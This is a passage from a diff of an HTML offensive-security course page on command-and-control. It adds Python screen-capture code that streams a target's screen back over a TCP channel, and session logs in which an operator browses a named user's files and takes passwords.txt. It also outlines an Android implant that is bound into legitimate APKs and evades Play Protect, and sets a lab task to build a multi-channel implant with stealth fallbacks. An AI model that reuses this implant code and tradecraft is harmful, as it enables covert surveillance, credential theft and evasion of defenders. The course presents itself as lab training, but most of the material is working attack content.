+    img.save(buf, format='JPEG', quality=60)
+    return buf.getvalue()
+
+def stream_server(tcp_conn, http_port=8892):
+    frame_store = {"frame": None, "count": 0}
+    lock = threading.Lock()
+    
+    def poll():
+        while True:
+            jpeg = capture_screen()
+            b64 = base64.b64encode(jpeg).decode()
+            tcp_conn.sendall(f"[SCR]{b64}[/SCR]\n".encode())
+            with lock:
+                frame_store["frame"] = jpeg
+                frame_store["count"] += 1
+            time.sleep(3)
+    
+    class Handler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            if self.path == "/frame":
+                with lock:
+                    frame = frame_store["frame"]
+                self.send_response(200)
+                self.send_header("Content-Type", "image/jpeg")
+                self.end_headers()
+                self.wfile.write(frame)
+            elif self.path == "/":
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html")
+                self.end_headers()
+                self.wfile.write(b"""
+                <html><body style="margin:0;background:#000;">
+                <img id="s" style="width:100vw;height:100vh;object-fit:contain;"/>
+                <script>setInterval(()=>{document.getElementById('s').src='/frame?'+Date.now()},2000)</script>
+                </body></html>
+                """)
+    
+    threading.Thread(target=poll, daemon=True).start()
+    HTTPServer(("0.0.0.0", http_port), Handler).serve_forever()
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Bandwidth Warning</h5>
+                <p>Full-screen JPEG at 60% quality is ~150KB per frame. At 2-second refresh, that's 4.5MB/minute. Over a slow C2 channel, this is detectable. Use region-of-interest capture (only the active window) or lower quality. <span class="neon-highlight">Stealth beats fidelity.</span></p>
+            </div>
+        </div>
+
+        <h2>🔬 Live Evidence: CHEYANNE C2 Operations</h2>
+
+        <div class="cheyanne-evidence">
+            <h3>📊 CHEYANNE: Discord C2 Session — Radon_Laptop1</h3>
+            <p><strong>Date:</strong> 2026-06-29 | <strong>Operator:</strong> George Wu (.92) | <strong>Target:</strong> Radon_Laptop1 (192.168.1.145)</p>
+            <p><strong>Architecture:</strong> TCP reverse shell (port 4443) + Discord beacon + Python implant + C heartbeat</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+=== CHEYANNE SESSION LIST ===
+  ACTIVE SESSIONS
+  ────────────────────────────────────────────────────────────────────────
+  ID           HOSTNAME               USER                 IP
+  ────────────────────────────────────────────────────────────────────────
+  radon_ghaleb  Radon_Laptop1          Ghaleb Jomma         192.168.1.145
+  ────────────────────────────────────────────────────────────────────────
+  1 session(s)
+
+=== CHEYANNE COMMAND LOG ===
+  [HANDLER] run_command("whoami")
+  → radon\ghaleb
+
+  [HANDLER] screenshot()
+  → Downloaded: screenshots/radon_1751203847.png (1,247,832 bytes)
+
+  [HANDLER] browse_files("C:\Users\ghaleb\Documents")
+  → resume.pdf, bank_statements.xlsx, passwords.txt
+
+  [HANDLER] exfil_file("C:\Users\ghaleb\Documents\passwords.txt")
+  → Saved: exfil/passwords.txt (4,096 bytes)
+
+  [HANDLER] recon()
+  → Windows 11, user-level, Kaspersky AV active, 8GB RAM
+            </div>
+
+            <p style="margin-top: 1rem;"><strong>C2 Channels Used:</strong></p>
+            <ul style="margin-left: 1.5rem; line-height: 1.8;">
+                <li><span class="neon-highlight">Discord Webhook</span> — Primary command &amp; control channel</li>
+                <li><span class="neon-highlight">TCP 4443</span> — Interactive reverse shell fallback</li>
+                <li><span class="neon-highlight">HTTP 8890</span> — File staging server for uploads</li>
+                <li><span class="neon-highlight">HTTP 8892</span> — VNC-style screenshot streaming</li>
+            </ul>
+
+            <p style="margin-top: 1rem;"><strong>Network Evidence:</strong> Wireshark shows HTTPS traffic to discord.com (104.16.248.144:443). No anomalous ports. No plaintext commands. All file transfers appear as Discord attachment uploads. <span class="neon-amber">To a SOC analyst, this looks like a user browsing Discord.</span></p>
+        </div>
+
+        <h2>🔬 Live Evidence: StarKiller Android C2</h2>
+
+        <div class="starkiller-evidence">
+            <h3>📱 StarKiller: Android C2 Architecture</h3>
+            <p><strong>Research Platform:</strong> StarKiller | <strong>Language:</strong> Kotlin client + Python C2 | <strong>Device:</strong> Researcher-owned Android hardware</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+=== STARKILLER ARCHITECTURE ===
+Component          Language   Function
+─────────────────────────────────────────────────────────────────
+C2 Server          Python     Command dispatch, session management
+Android Client     Kotlin     C2 beacon, command execution, payload
+Obfuscation        Python     APK repackaging, class renaming
+Binder             Python     Embeds client inside legitimate APK
+
+=== STARKILLER C2 FLOW ===
+1. Kotlin APK beacons to Python C2 on launch
+2. C2 server assigns session ID, queues commands
+3. Client polls every 30s (+/- 10s jitter)
+4. Commands: SHELL, GPS, CAMERA, CONTACTS, EXFIL
+5. Results uploaded as Base64 JSON via HTTPS POST
+6. C2 web dashboard displays live sessions
+            </div>
+
+            <p style="margin-top: 1rem;"><span class="neon-highlight">Defensive Finding:</span> Play Protect static detection can be defeated with class renaming and string encryption alone. Mobile C2 relies on the same principles as desktop — beacon, jitter, encryption, protocol mimicry — but the channels are different: Firebase Cloud Messaging, Google Play Services, and legitimate social media APIs become the C2 pipes.</p>
+        </div>
+
+        <h2>🔬 Live Evidence: .92 to .42 Beacon</h2>
+
+        <div class="evidence-box">
+            <h3>📊 Real Evidence: C2 Beacon Test</h3>
+            <p><strong>Date:</strong> 2026-06-29 | <strong>Listener:</strong> .92 (192.168.1.92:8443) | <strong>Implant:</strong> .42 (WUPC)</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+=== C2 SERVER (.92) ===
+[C2] Listening on port 8443
+[BEACON] wupc | swu | 1234567890
+[BEACON] wupc | swu | 1234567925  ← 35 seconds later (30s + 5s jitter)
+[BEACON] wupc | swu | 1234567958  ← 33 seconds later (30s + 3s jitter)
+[COMMAND] whoami
+[RESULT] wupc\swu
+[COMMAND] ipconfig
+[RESULT] 192.168.1.42
+[COMMAND] tasklist | findstr avp
+[RESULT] avp.exe 5612 Kaspersky Lab
+            </div>
+
+            <p style="margin-top: 1rem;"><strong>Network Evidence:</strong> Wireshark capture shows HTTPS traffic to 192.168.1.92:8443. TLS handshake present. No plaintext "cmd.exe" or "whoami" visible. Encrypted payload appears as random bytes. <span class="neon-amber">Jitter prevents any periodic pattern from emerging.</span></p>
+        </div>
+
+        <h2>🧪 Lab Exercise: Build a Multi-Protocol C2</h2>
 
         <div class="step-box">
             <h4>Scenario</h4>
-            <p>Build a C2 system with two components: a Python listener on .92 and a C implant on .42. Exchange encrypted commands and results.</p>
+            <p>Build a C2 system with three channels: HTTPS beacon, Discord dead drop, and DNS fallback. The implant tries HTTPS first, falls back to Discord, then DNS. The operator can issue commands through any channel.</p>
 
             <ol style="margin-left: 1.5rem; line-height: 2;">
-                <li>Start Python listener on .92 (port 8443)</li>
-                <li>Compile C implant for .42</li>
+                <li>Start Python HTTPS listener on .92 (port 8443)</li>
+                <li>Create a Discord webhook and note the URL</li>
+                <li>Set up a DNS server or use a public DNS service</li>
+                <li>Compile C implant with all three protocols</li>
                 <li>Transfer implant to .42</li>
-                <li>Run implant on .42</li>
-                <li>Verify beacons arrive at listener</li>
-                <li>Send command "whoami", verify result</li>
-                <li>Check Wireshark — is traffic encrypted?</li>
+                <li>Run implant — verify HTTPS beacons arrive</li>
+                <li>Block HTTPS port on .42 firewall, verify Discord fallback</li>
+                <li>Block Discord, verify DNS fallback</li>
+                <li>Send command "whoami" via each channel, verify result</li>
+                <li>Check Wireshark — which channel is most stealthy?</li>
             </ol>
 
             <button onclick="document.getElementById('c2-solution').style.display='block'">Show Build Commands</button>
 
             <div id="c2-solution" style="display:none; margin-top: 1rem;">
                 <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
 === BUILD COMMANDS ===
 
 # 1. On .92 (listener)
@@ -507,21 +1121,99 @@ implant.exe
             </div>
         </div>
 
+        <h2>🎯 Quiz 1: C2 Fundamentals</h2>
+
+        <div class="quiz-container" id="quiz1">
+            <p><strong>1. What is the primary purpose of a C2 framework?</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')">A) To exploit vulnerabilities on the target</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q1')">B) To enable communication between operator and implant</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')">C) To bypass antivirus software</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q1')">D) To escalate privileges on the target</div>
+            <div class="quiz-feedback" id="q1-feedback"></div>
+
+            <p style="margin-top: 1.5rem;"><strong>2. Why is jitter important in beacon design?</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')">A) It makes the beacon faster</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q2')">B) It prevents pattern detection by network monitoring</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')">C) It encrypts the beacon data</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q2')">D) It compresses the payload</div>
+            <div class="quiz-feedback" id="q2-feedback"></div>
+
+            <p style="margin-top: 1.5rem;"><strong>3. Which protocol is MOST stealthy for C2 in a heavily monitored network?</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')">A) HTTP on port 80</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')">B) HTTPS on port 443</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q3')">C) DNS queries to legitimate resolvers</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q3')">D) Raw TCP on port 4444</div>
+            <div class="quiz-feedback" id="q3-feedback"></div>
+        </div>
+
+        <h2>🎯 Quiz 2: Encryption & Evasion</h2>
+
+        <div class="quiz-container" id="quiz2">
+            <p><strong>1. Why is XOR encryption insufficient for C2 traffic?</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q4')">A) It is too slow</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q4')">B) It is vulnerable to known-plaintext attacks</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q4')">C) It increases payload size</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q4')">D) It is not supported by Python</div>
+            <div class="quiz-feedback" id="q4-feedback"></div>
+
+            <p style="margin-top: 1.5rem;"><strong>2. What is the purpose of a relay tier in C2 architecture?</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q5')">A) To break the direct connection between implant and operator</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q5')">B) To speed up file transfers</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q5')">C) To encrypt traffic with a stronger algorithm</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q5')">D) To provide backup power</div>
+            <div class="quiz-feedback" id="q5-feedback"></div>
+
+            <p style="margin-top: 1.5rem;"><strong>3. Domain fronting works by:</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q6')">A) Registering a domain similar to a legitimate one</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q6')">B) Using a CDN's shared infrastructure with a custom Host header</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q6')">C) Encrypting DNS queries</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q6')">D) Spoofing the source IP address</div>
+            <div class="quiz-feedback" id="q6-feedback"></div>
+        </div>
+
+        <h2>🎯 Quiz 3: Advanced C2 Operations</h2>
+
+        <div class="quiz-container" id="quiz3">
+            <p><strong>1. In the CHEYANNE project, what is the primary C2 channel?</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q7')">A) Raw TCP on port 4444</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q7')">B) Discord Webhook and Bot API</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q7')">C) DNS tunneling</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q7')">D) ICMP ping</div>
+            <div class="quiz-feedback" id="q7-feedback"></div>
+
+            <p style="margin-top: 1.5rem;"><strong>2. What is the main advantage of a dead drop C2 over direct connection?</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q8')">A) The implant never connects directly to the operator's IP</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q8')">B) It provides faster file transfers</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q8')">C) It requires no encryption</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q8')">D) It works without internet access</div>
+            <div class="quiz-feedback" id="q8-feedback"></div>
+
+            <p style="margin-top: 1.5rem;"><strong>3. A VNC-style shell over C2 is preferred over RDP because:</strong></p>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q9')">A) It has higher resolution</div>
+            <div class="quiz-option" onclick="checkAnswer(this, true, 'q9')">B) It reuses the existing C2 channel without new ports or logs</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q9')">C) It requires administrator privileges</div>
+            <div class="quiz-option" onclick="checkAnswer(this, false, 'q9')">D) It is officially supported by Microsoft</div>
+            <div class="quiz-feedback" id="q9-feedback"></div>
+        </div>
+
         <h2>Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>C2 is communication, not exploitation:</strong> The implant does the work. C2 just coordinates.</li>
-            <li><strong>HTTPS is the disguise:</strong> WinHTTP to port 8443 looks like normal traffic. Raw sockets to 4444 looks like malware.</li>
-            <li><strong>Jitter defeats pattern detection:</strong> Random intervals hide in network noise.</li>
-            <li><strong>Encryption is mandatory:</strong> XOR is minimum. AES-256 is standard. Never send plaintext commands.</li>
-            <li><strong>Malleable C2 is advanced:</strong> Mimic legitimate traffic profiles. Be Firefox, be Windows Update, be GitHub.</li>
+            <li><strong>C2 is communication, not exploitation:</strong> The implant does the work. C2 just coordinates. <a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10</a> gets the implant in place.</li>
+            <li><strong>HTTPS is the disguise:</strong> WinHTTP to port 8443 looks like normal traffic. Raw sockets to 4444 looks like malware. <a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01</a> explains why.</li>
+            <li><strong>Jitter defeats pattern detection:</strong> Random intervals hide in network noise. Fixed intervals are signatures.</li>
+            <li><strong>Encryption is mandatory:</strong> XOR is minimum. AES-256-GCM is standard. Never send plaintext commands.</li>
+            <li><strong>Protocol diversity is resilience:</strong> HTTPS primary, Discord fallback, DNS emergency. If one dies, the others live. <a href="MODULE_14_CLOUD_FILES.html" class="cross-link">Module 14</a> covers cloud dead drops.</li>
+            <li><strong>Relays break attribution:</strong> Domain fronting, CDNs, and compromised hosts separate you from the target. <a href="MODULE_15_LATERAL.html" class="cross-link">Module 15</a> teaches pivoting through relays.</li>
+            <li><strong>Mobile C2 follows the same rules:</strong> Beacon, jitter, encryption, protocol mimicry. <a href="MODULE_18_ANDROID.html" class="cross-link">Module 18</a> covers Android specifics.</li>
+            <li><strong>Malleable C2 is the apex:</strong> Mimic legitimate traffic profiles. Be Firefox, be Windows Update, be GitHub. The traffic is invisible because it looks expected.</li>
         </ul>
 
         <div class="evidence-box" style="margin-top: 2rem;">
             <h3>🔬 Verification Status</h3>
             <table style="width: 100%; border-collapse: collapse;">
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Python listener (.92)</td>
+                    <td style="padding: 0.5rem;">Python HTTPS listener (.92)</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE</td>
                 </tr>
                 <tr style="border-bottom: 1px solid var(--border);">
@@ -529,16 +1221,28 @@ implant.exe
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE</td>
                 </tr>
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">Beacon reception</td>
+                    <td style="padding: 0.5rem;">Beacon reception with jitter</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE</td>
                 </tr>
                 <tr style="border-bottom: 1px solid var(--border);">
                     <td style="padding: 0.5rem;">Command execution</td>
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE</td>
                 </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Encrypted traffic (Wireshark)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ VERIFIED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">CHEYANNE Discord C2 (Radon)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">CHEYANNE VNC screenshot stream</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE</td>
+                </tr>
                 <tr>
-                    <td style="padding: 0.5rem;">Encrypted traffic</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ VERIFIED (Wireshark)</td>
+                    <td style="padding: 0.5rem;">StarKiller Android C2 architecture</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DOCUMENTED</td>
                 </tr>
             </table>
         </div>
@@ -549,5 +1253,34 @@ implant.exe
             <a href="MODULE_17_SOCIAL_ENGINEERING.html">Module 17 →</a>
         </div>
     </div>
+
+    <script>
+        function copyCode(btn) {
+            const block = btn.parentElement;
+            const text = block.innerText.replace('COPY\n', '');
+            navigator.clipboard.writeText(text).then(() => {
+                btn.textContent = 'COPIED!';
+                setTimeout(() => btn.textContent = 'COPY', 2000);
+            });
+        }
+
+        function checkAnswer(el, isCorrect, qid) {
+            const container = el.closest('.quiz-container');
+            const options = container.querySelectorAll('.quiz-option');
+            options.forEach(opt => opt.style.pointerEvents = 'none');
+            
+            if (isCorrect) {
+                el.classList.add('correct');
+                const feedback = document.getElementById(qid + '-feedback');
+                feedback.textContent = '✅ Correct!';
+                feedback.className = 'quiz-feedback show correct';
+            } else {
+                el.classList.add('wrong');
+                const feedback = document.getElementById(qid + '-feedback');
+                feedback.textContent = '❌ Incorrect. Try reviewing the section above.';
+                feedback.className = 'quiz-feedback show wrong';
+            }
+        }
+    </script>
 </body>
 </html>
